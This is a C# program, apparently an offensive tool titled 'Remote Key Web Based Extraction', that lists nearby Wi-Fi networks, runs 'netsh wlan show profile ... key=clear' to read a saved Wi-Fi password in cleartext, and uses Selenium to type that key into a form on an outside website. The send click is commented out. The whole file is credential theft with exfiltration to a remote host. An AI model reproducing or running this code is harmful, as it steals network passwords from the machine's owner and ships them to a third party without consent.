using System;
using Windows.Devices.WiFi;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Net.Http;
using OpenQA.Selenium;
using OpenQA.Selenium.Edge;
using OpenQA.Selenium.Firefox;

namespace Remote_Key_Web_Based_Extraction
{
    class Remote_Key_Web_Based_Extraction
    {
        static List<string> access_point_names = new List<string>();

        static void Main(string[] args)
        {
            Remote_Key_Web_Based_Extraction main_program = new Remote_Key_Web_Based_Extraction();
            var ap_extraction_task = main_program.extract_access_point_names();
            ap_extraction_task.Wait();
            string key_content = main_program.local_key_content_extraction();
            Console.WriteLine("Opportunity to obfuscate key_content:");
            string obfuscation = Console.ReadLine();
            key_content += obfuscation;
            main_program.web_content_key_extraction(key_content);
        }

        public async Task extract_access_point_names()
        {
            // Credits: https://stackoverflow.com/questions/496568/how-do-i-get-the-available-wifi-aps-and-their-signal-strength-in-net?rq=1
            var adapters = await WiFiAdapter.FindAllAdaptersAsync();
            foreach (var adapter in adapters)
            {
                foreach (var network in adapter.NetworkReport.AvailableNetworks)
                {
                    Console.WriteLine($"ssid: {network.Ssid}" + " | " + $"signal strength: {network.SignalBars}");
                    access_point_names.Add(network.Ssid);
                }
            }
        }

        public string local_key_content_extraction()
        {
            Console.WriteLine("netsh wlan show profile " + access_point_names[0] + " key=clear");
            PowerShell ps = PowerShell.Create();
            ps.AddCommand("netsh")
                .AddParameter("wlan show profile " + access_point_names[0], "key=clear");
            var results = ps.Invoke();
            /*
            foreach (var item in results)
            {
                Console.WriteLine(item);
            }
            */
            foreach (var item in results)
            {
                if (item.ToString().Contains("Key Content"))
                {
                    string final_key = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
                    return final_key;
                }
            }
            return "nil";
        }
        /*
        public async Task extract_website_password()
        {
            HttpClient client = new HttpClient();
            string s = await client.GetStringAsync("Website-here");
            s = s.Substring(s.IndexOf("<title>") + "<title>".Length, s.IndexOf("</title>") - s.IndexOf("<title>") - "<title>".Length);
        }
        */

        public void web_content_key_extraction(string key_content)
        {
            /*
            EdgeOptions edgeOptions = new EdgeOptions();
            var current_drver = new EdgeDriver();
            OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
            var options = new EdgeOptions();
            options.UseInPrivateBrowsing = true;
            var current_driver = new EdgeDriver(options);
            */
            try
            {
                Console.WriteLine("[=] Attempting to try Chrome");
                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
                current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                current_driver.FindElement(By.Name("message")).SendKeys(key_content);
                //current_driver.FindElement(By.Name("send")).Click();
                current_driver.Quit();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.WriteLine("[=] Attempting to try FireFox");
                OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
                current_drver.Navigate();
                current_drver.Url = "https://anthony-t-n.github.io/";
                current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_content);
                //current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
                current_drver.Quit();
            }
            finally
            {
                Console.WriteLine("[+] Successfully extracted content key from local device");
            }
        }
    }
}
